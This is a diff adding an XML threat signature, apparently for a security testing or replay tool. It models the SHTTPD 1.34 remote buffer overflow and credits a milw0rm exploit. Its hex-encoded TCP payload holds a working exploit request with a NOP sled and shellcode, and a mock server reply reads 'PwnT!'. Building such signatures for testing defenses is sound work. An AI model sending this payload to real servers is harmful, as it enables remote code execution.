@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SHTTPD Remote Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat leverages a buffer overflow Vulnerability in the SHTTPD web server whereby an attacker can execute code on the affected system with the privileges of the running service. SHTTPD is a web server and typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="SHTTPD"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="SHTTPD_SHTTPD"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="SHTTPD_SHTTPD_1.34"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/2482"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="20393"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="6110c66941b70d72f1dc847e6c2239ba"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632962982379531250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1163454213" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="E"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="504F5354202F25343125343125343125343125343125343125343125343125373325433325324125344625393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025393025333325633925383325653925646525643925656525643925373425323425663425356225383125373325313325353225636125326225653025383325656225666325653225663425616525323225366625653025353225636125613025613525366525343125353725653525326125636225633425366225316425643225613025626625373225636225633025613925643925666525613025653125626325666225656225373925666525346525656225393425353525306225653125656425353325303825633025313425363925396525306625653425323725326625613025626625373625636225633025383625643925633625363025366225306425643625326125306225643925643625613025653125623925343325373725633425353625303925316125323025333625343125366225643025643725306125353325656325643925386125323725366225323225643625383625366225336125633225633025653925643925346125396225653025353225636125613025383825366525393525316125313625333225396325613225313825643125306125353025623025336125336125613125653425306425613225623325316525643825633425376325316625623525613925346125386325333125636125326225653020485454502F312E300D0A484F53543A7777772E7365727665722E636F6D0D0A557365722D4167656E743A204D6F7A696C6C612F352E30202842654F533B20553B2042654F5320582E363B20656E2D55533B2072763A312E372E3829204765636B6F2F32303035303531312046697265666F782F312E302E340D0A436F6E6E656374696F6E3A20436C6F73650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
